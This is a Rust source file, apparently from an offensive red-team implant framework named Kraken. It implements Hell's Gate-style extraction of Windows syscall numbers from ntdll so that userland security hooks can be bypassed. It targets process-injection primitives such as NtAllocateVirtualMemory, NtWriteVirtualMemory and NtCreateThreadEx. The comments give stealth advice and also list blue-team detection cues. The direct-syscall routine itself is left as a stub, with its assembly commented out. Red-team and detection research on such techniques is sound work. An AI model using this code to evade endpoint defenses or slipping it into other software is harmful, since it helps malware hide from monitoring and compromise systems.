//! Syscall extraction (Hell's Gate style)
//!
//! Extracts syscall numbers from ntdll functions for direct invocation,
//! bypassing any userland hooks without modifying ntdll.
//!
//! ## Technique
//! Nt* functions in ntdll follow a pattern:
//! ```asm
//! mov r10, rcx        ; 4C 8B D1
//! mov eax, <syscall>  ; B8 XX XX 00 00
//! ...
//! syscall             ; 0F 05
//! ret                 ; C3
//! ```
//!
//! We extract the syscall number from the mov eax instruction.
//! If the function is hooked (different prologue), we can try to
//! extract from a nearby unhoooked function.
//!
//! ## OPSEC Considerations
//! - Does not modify ntdll (stealthiest approach)
//! - Direct syscalls bypass all userland hooks
//! - Syscall numbers vary by Windows version
//!
//! ## Detection (Blue Team)
//! - Syscall instructions outside ntdll
//! - Call stacks that don't traverse ntdll
//! - Pattern scanning for syscall stub patterns in process memory

use super::pe::get_proc_address;
use common::KrakenError;

/// Syscall table containing extracted syscall numbers
#[cfg(target_os = "windows")]
#[derive(Debug, Clone)]
pub struct SyscallTable {
    pub nt_allocate_virtual_memory: u32,
    pub nt_protect_virtual_memory: u32,
    pub nt_read_virtual_memory: u32,
    pub nt_write_virtual_memory: u32,
    pub nt_create_thread_ex: u32,
    pub nt_open_process: u32,
    pub nt_close: u32,
    pub nt_query_information_process: u32,
    pub nt_query_system_information: u32,
    pub nt_create_file: u32,
    pub nt_open_file: u32,
    pub nt_read_file: u32,
    pub nt_write_file: u32,
}

#[cfg(target_os = "windows")]
impl SyscallTable {
    /// Build syscall table by extracting numbers from ntdll
    pub fn build() -> Result<Self, KrakenError> {
        use super::pe::get_module_base;

        let ntdll = get_module_base("ntdll.dll")
            .ok_or_else(|| KrakenError::Module("failed to get ntdll base".into()))?;

        Ok(Self {
            nt_allocate_virtual_memory: extract_syscall_number(ntdll, "NtAllocateVirtualMemory")?,
            nt_protect_virtual_memory: extract_syscall_number(ntdll, "NtProtectVirtualMemory")?,
            nt_read_virtual_memory: extract_syscall_number(ntdll, "NtReadVirtualMemory")?,
            nt_write_virtual_memory: extract_syscall_number(ntdll, "NtWriteVirtualMemory")?,
            nt_create_thread_ex: extract_syscall_number(ntdll, "NtCreateThreadEx")?,
            nt_open_process: extract_syscall_number(ntdll, "NtOpenProcess")?,
            nt_close: extract_syscall_number(ntdll, "NtClose")?,
            nt_query_information_process: extract_syscall_number(ntdll, "NtQueryInformationProcess")?,
            nt_query_system_information: extract_syscall_number(ntdll, "NtQuerySystemInformation")?,
            nt_create_file: extract_syscall_number(ntdll, "NtCreateFile")?,
            nt_open_file: extract_syscall_number(ntdll, "NtOpenFile")?,
            nt_read_file: extract_syscall_number(ntdll, "NtReadFile")?,
            nt_write_file: extract_syscall_number(ntdll, "NtWriteFile")?,
        })
    }
}

/// Expected prologue for unhooked Nt* function:
/// 4C 8B D1 = mov r10, rcx
/// B8 XX XX 00 00 = mov eax, <syscall_number>
#[cfg(target_os = "windows")]
const SYSCALL_PROLOGUE: [u8; 3] = [0x4C, 0x8B, 0xD1];
#[cfg(target_os = "windows")]
const MOV_EAX_OPCODE: u8 = 0xB8;

/// Extract syscall number from an Nt* function
#[cfg(target_os = "windows")]
fn extract_syscall_number(ntdll: *const u8, func_name: &str) -> Result<u32, KrakenError> {
    let func_addr = get_proc_address(ntdll, func_name)
        .ok_or_else(|| KrakenError::Module(format!("failed to find {}", func_name)))?;

    unsafe {
        // Check for expected prologue
        if *func_addr == SYSCALL_PROLOGUE[0]
            && *func_addr.add(1) == SYSCALL_PROLOGUE[1]
            && *func_addr.add(2) == SYSCALL_PROLOGUE[2]
            && *func_addr.add(3) == MOV_EAX_OPCODE
        {
            // Extract syscall number from mov eax, imm32
            let syscall_num = *(func_addr.add(4) as *const u32);
            return Ok(syscall_num);
        }

        // Function appears to be hooked, try to find syscall number elsewhere
        // Strategy: Look at neighboring functions and interpolate

        // Alternative: scan forward for the syscall instruction pattern
        // and work backwards to find the mov eax
        for offset in 0..32 {
            if *func_addr.add(offset) == MOV_EAX_OPCODE {
                // Check if followed by plausible syscall number (< 0x1000)
                let potential_num = *(func_addr.add(offset + 1) as *const u32);
                if potential_num < 0x1000 {
                    return Ok(potential_num);
                }
            }
        }

        Err(KrakenError::Module(format!(
            "{} appears hooked, syscall extraction failed",
            func_name
        )))
    }
}

/// Execute a syscall directly (x64 Windows)
/// Note: This is a simplified version. Real implementation needs
/// proper register setup via inline assembly.
#[cfg(target_os = "windows")]
#[allow(dead_code)]
pub unsafe fn do_syscall(
    syscall_num: u32,
    arg1: usize,
    arg2: usize,
    arg3: usize,
    arg4: usize,
) -> isize {
    // In real implementation, this would be inline assembly:
    // mov r10, rcx
    // mov eax, syscall_num
    // syscall
    // ret

    // For now, we just document the interface
    // Actual inline asm would look like:
    /*
    core::arch::asm!(
        "mov r10, rcx",
        "mov eax, {0:e}",
        "syscall",
        in(reg) syscall_num,
        in("rcx") arg1,
        in("rdx") arg2,
        in("r8") arg3,
        in("r9") arg4,
        out("rax") ret_val,
        clobber_abi("system")
    );
    */

    // Placeholder - real usage requires feature(naked_functions) or external asm
    let _ = (syscall_num, arg1, arg2, arg3, arg4);
    -1 // STATUS_NOT_IMPLEMENTED
}

#[cfg(not(target_os = "windows"))]
#[derive(Debug, Clone)]
pub struct SyscallTable;

#[cfg(not(target_os = "windows"))]
impl SyscallTable {
    pub fn build() -> Result<Self, KrakenError> {
        Err(KrakenError::Module(
            "syscall extraction only supported on Windows".into(),
        ))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    #[cfg(not(target_os = "windows"))]
    fn test_syscall_table_fails_on_non_windows() {
        let result = SyscallTable::build();
        assert!(result.is_err());
    }

    #[test]
    #[cfg(target_os = "windows")]
    fn test_syscall_prologue_constants() {
        assert_eq!(SYSCALL_PROLOGUE, [0x4C, 0x8B, 0xD1]);
        assert_eq!(MOV_EAX_OPCODE, 0xB8);
    }
}
